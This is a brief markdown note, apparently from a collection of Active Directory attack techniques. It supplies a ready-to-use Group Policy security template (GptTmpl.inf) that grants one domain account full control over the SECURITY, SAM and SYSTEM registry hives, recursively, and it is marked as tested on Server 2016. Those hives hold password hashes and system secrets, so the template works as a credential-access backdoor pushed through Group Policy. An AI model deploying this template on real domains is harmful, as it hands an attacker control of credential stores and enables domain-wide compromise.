# Registry Key DACLs
Delegate full control of `HKLM\{SECURITY, SAM, SYSTEM}` to `S-1-5-21-1078383433-4142403703-1311514137-1105` recursively.

## File Path
`\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf`

## File Template
```
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Registry Keys]
"MACHINE\SECURITY",0,"D:PAR(A;CI;KR;;;S-1-15-2-1)(A;CI;KA;;;S-1-5-21-1078383433-4142403703-1311514137-1105)(A;CIIO;KA;;;CO)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)"
"MACHINE\SAM",0,"D:PAR(A;CI;KR;;;S-1-15-2-1)(A;CI;KA;;;S-1-5-21-1078383433-4142403703-1311514137-1105)(A;CIIO;KA;;;CO)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)"
"MACHINE\SYSTEM",0,"D:PAR(A;CI;KR;;;S-1-15-2-1)(A;CI;KA;;;S-1-5-21-1078383433-4142403703-1311514137-1105)(A;CIIO;KA;;;CO)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)"
```

## Tested On
- Server 2016